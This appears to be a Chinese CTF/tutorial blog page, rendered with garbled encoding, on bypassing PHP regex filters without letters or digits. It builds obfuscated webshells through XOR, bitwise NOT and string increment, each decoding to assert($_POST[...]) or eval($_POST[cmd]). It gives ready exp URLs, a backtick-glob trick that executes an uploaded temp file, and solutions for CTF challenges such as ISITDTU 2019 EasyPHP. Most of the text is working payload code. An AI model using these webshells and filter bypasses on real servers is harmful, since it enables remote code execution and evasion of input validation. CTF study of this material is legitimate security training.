<h2 id="æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰"><a href="#æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰"></a><strong>æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="comment">//è¾“å‡ºa</span></span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line">$__=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?shell&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¿™ä¸ªä»£ç è¡¨è¾¾å¼è®¡ç®—å‡ºå¼‚æˆ–å¯è§çš„ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200724162439697.png" style="high:80%;width:80%;" />



<h2 id="æ–¹æ³•äºŒï¼ˆå–åï¼‰"><a href="#æ–¹æ³•äºŒï¼ˆå–åï¼‰" class="headerlink" title="æ–¹æ³•äºŒï¼ˆå–åï¼‰"></a><strong>æ–¹æ³•äºŒï¼ˆå–åï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ~(<span class="string">&#x27;ç°&#x27;</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">//è¾“å‡ºa</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œæœ‰æ•°å­—1ï¼Œè¦å¦å¤–æƒ³åŠæ³•æ„é€ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"><span class="keyword">echo</span> $_;</span><br><span class="line"><span class="comment">//è¾“å‡º1</span></span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$___=<span class="string">&quot;ç°&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;å’Œ&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;å’Œ&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;çš„&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;åŠ&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;å§‹&quot;</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">&#x27;_&#x27;</span>;$___=<span class="string">&quot;ä¿¯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;ç°&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;æ¬¡&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;ç«™&quot;</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"><span class="comment">//assert($_POST[2]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?shell=$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)%2b(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;ç°&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;å’Œ&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;å’Œ&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;çš„&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;åŠ&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;å§‹&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;ä¿¯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;ç°&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;æ¬¡&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;ç«™&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰"></a><strong>æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="comment">//è¾“å‡ºArray</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è‡ªå¢æ„é€ å­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">$a++;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//è¾“å‡ºb</span></span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?shell=$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;</span><br><span class="line">$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$____.=$__;</span><br><span class="line">$__=$_;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="æ— å­—ç¬¦ç»•è¿‡-æé«˜ç¯‡"><a href="#æ— å­—ç¬¦ç»•è¿‡-æé«˜ç¯‡" class="headerlink" title="æ— å­—ç¬¦ç»•è¿‡(æé«˜ç¯‡)"></a><strong>æ— å­—ç¬¦ç»•è¿‡(æé«˜ç¯‡)</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¯”ä¸Šé¢å¤šäº†ä¸¤ä¸ªé™åˆ¶</p>
<ul>
<li>webshellé•¿åº¦ä¸è¶…è¿‡35ä½</li>
<li>é™¤äº†ä¸åŒ…å«å­—æ¯æ•°å­—ï¼Œè¿˜ä¸èƒ½åŒ…å«<code>$</code>å’Œ<code>_</code></li>
</ul>
<p><strong>php7.2ä¸‹ç®€å•è§£å†³é—®é¢˜</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><strong>php5çš„æ€è€ƒ</strong></p>
<p>å¦‚æœæˆ‘ä»¬ç”¨ä¸Šé¢7.2çš„expä¼šæŠ¥é”™ï¼ŒåŸå› å°±æ˜¯php5å¹¶ä¸æ”¯æŒè¿™ç§è¡¨è¾¾æ–¹å¼ã€‚</p>
<p><strong>PHP5+shellæ‰“ç ´ç¦é”¢</strong></p>
<p>è¿™é‡Œåªèƒ½æ˜¯åœ¨linuxçš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸï¼Œç›´æ¥ç”¨Pç¥ç¦»åˆ«æ­Œçš„å›¾äº†ã€‚</p>
<p>â€œåå¼•å·â€æ˜¯PHPä¸­æœ€ç®€å•çš„æ‰§è¡Œshellçš„æ–¹æ³•ã€‚</p>
<p><code>.file</code>èƒ½ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚å¦‚æœæˆ‘ä»¬POSTå‘é€ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p>
<p>æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p>
<ul>
<li><p><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</p>
</li>
<li><p><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</p>
</li>
<li><p><code>[^x]</code>çš„æ–¹æ³•æ¥æ„é€ â€è¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚</p>
</li>
<li><p><code>[@-[]</code>æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ã€‚</p>
</li>
</ul>
<p>æœ€åï¼Œæˆ‘ä¼ å…¥çš„codeä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</span><br></pre></td></tr></table></figure>

<p>å‘é€æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p>
<img src="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png" style="high:120%;width:120%;" />

<h1 id="æ— å­—ç¬¦ç»•è¿‡-ä¾‹é¢˜"><a href="#æ— å­—ç¬¦ç»•è¿‡-ä¾‹é¢˜" class="headerlink" title="æ— å­—ç¬¦ç»•è¿‡(ä¾‹é¢˜)"></a><strong>æ— å­—ç¬¦ç»•è¿‡(ä¾‹é¢˜)</strong></h1><h2 id="ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰"><a href="#ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰" class="headerlink" title="ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰"></a><strong>ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹åˆ°<code>~</code>è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸Šé¢æåˆ°çš„å–åç»•è¿‡å°±ä¸èƒ½ç”¨äº†ã€‚ä½†æ˜¯è¿™é‡Œçš„è¯å¹¶æ²¡æœ‰è¿‡æ»¤<code>$</code>ã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨å¼‚æˆ–çš„æ–¹å¼ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//è¾“å‡º_GET</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>

<p>æ„é€ webshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?a=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a0&#125;($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a1&#125;);&amp;%a0=assert&amp;%a1=eval($_POST[%27cmd%27])</span><br><span class="line">//$&#123;_GET&#125;&#123;%a0&#125;($&#123;_GET&#125;&#123;%a1&#125;);&amp;%a0=<span class="keyword">assert</span>&amp;%a1=eval($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„çš„å°±æ˜¯Pç¥åœ¨æé«˜ç¯‡é‡Œé¢è¯´åˆ°çš„ï¼Œå¦‚æœè¿™é“é¢˜ç›®æ˜¯PHPï¼—ç‰ˆæœ¬çš„è¯ï¼Œæ˜¯å¯ä»¥ç”¨å–ååŠ ä¸Šå¼‚æˆ–çš„æ–¹å¼å»åšçš„ï¼Œä½†æ˜¯å¦‚æœæœ¬é¢˜æ˜¯PHP5.6ç‰ˆæœ¬çš„è¯ï¼Œå› ä¸ºä¸æ”¯æŒè¿™ç§è¡¨è¾¾æ–¹å¼å°±åšä¸äº†ã€‚</p>
<h2 id="ä¾‹å­äºŒï¼ˆå–åï¼‰"><a href="#ä¾‹å­äºŒï¼ˆå–åï¼‰" class="headerlink" title="ä¾‹å­äºŒï¼ˆå–åï¼‰"></a><strong>ä¾‹å­äºŒï¼ˆå–åï¼‰</strong></h2><p>[ISITDTU 2019]EasyPHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€é¢˜è¿‡æ»¤çš„ä¸œè¥¿æ¯”è¾ƒå¤šï¼ŒæŠŠ<code>$</code>è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>~</code>ï¼Œå¯ä»¥ç”¨å–åçš„æ–¹å¼ã€‚</p>
<p>ä½†æ˜¯ç¬¬äºŒä¸ªè¿‡æ»¤ï¼Œ<code>strtolower</code>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼Œç”¨<code>count_chars</code>è¿”å›ç”±æ‰€æœ‰ä½¿ç”¨äº†çš„å­—èŠ‚å€¼ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå†åˆ¤æ–­å…¶ä¸­æ¯ä¸ªå­—ç¬¦ç´¯è®¡å‡ºç°æ¬¡æ•°æ˜¯å¦å¤§äº 13ã€‚</p>
<p>æŸ¥çœ‹phpinfo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?_=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<img src="http://goodcheerleung.gitee.io/blog/å¾®ä¿¡æˆªå›¾_20200717104946.png" style="high:80%;width:80%;" />

<p>æ„é€ shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[cmd]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$c);</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œçš„è¯æ„é€ shellç¬¬äºŒä¸ªè¿‡æ»¤è¿‡ä¸å»ï¼Œè€Œä¸”ç½‘ä¸Šæ²¡çœ‹åˆ°æœ‰writeupæœ‰æ„é€ shellçš„ï¼Œçœ‹åˆ°éƒ½æ˜¯å–åå¼‚æˆ–æ„é€ å‡½æ•°å»æ‰¾flagï¼Œè¿™é‡Œåˆæ°å¥½æ˜¯PHP7çš„ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œè¿™é‡Œè´´ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹</p>
<ul>
<li>å–åå¼‚æˆ–</li>
</ul>
